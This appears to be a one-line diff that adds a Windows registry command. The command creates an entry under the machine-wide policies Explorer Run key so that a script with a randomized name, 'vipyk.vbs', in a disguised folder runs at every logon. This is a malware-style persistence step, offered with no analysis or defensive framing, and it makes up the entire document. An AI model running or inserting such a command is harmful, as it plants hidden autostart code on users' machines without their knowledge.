@@ -1,0 +1,1 @@
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\run /v C:\ms713763.exe /d C:\winx\windows\vipyk.vbs /f
